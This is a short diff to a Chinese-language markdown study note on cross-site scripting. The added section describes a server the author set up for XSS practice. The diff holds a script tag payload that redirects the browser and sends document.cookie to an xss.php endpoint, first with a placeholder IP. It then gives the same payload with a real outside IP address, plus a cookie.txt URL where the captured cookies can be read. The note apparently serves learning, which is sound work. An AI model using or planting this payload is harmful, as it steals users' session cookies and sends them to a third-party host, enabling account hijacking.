@@ -15,3 +15,18 @@ window.location.href='www.baidu.com'	  用于相当于跳转地址
 <script>window.location.href='http://[ip]/xss.php?cookie='+document.cookie</script>
 ````
      
+
+
+
+
+## 我直接买了一个服务器并且开放了读写权限可以拿来实验XSS
+
+````
+相关的ip
+<script>window.location.href='http://106.53.207.220/xss.php?cookie='+document.cookie</script>
+
+
+回显请看
+http://106.53.207.220/cookie.txt
+````
+
